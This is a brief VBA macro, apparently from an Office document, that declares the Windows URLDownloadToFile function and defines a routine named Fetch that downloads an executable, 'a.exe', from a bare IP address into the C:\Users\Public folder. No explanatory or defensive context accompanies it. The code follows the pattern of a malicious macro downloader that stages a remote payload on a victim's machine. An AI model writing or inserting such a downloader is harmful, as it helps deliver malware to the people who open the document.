Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal a As LongPtr, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As LongPtr) As Long
Sub Fetch()
    URLDownloadToFile 0, "http://198.51.100.7/a.exe", "C:\Users\Public\a.exe", 0, 0
End Sub
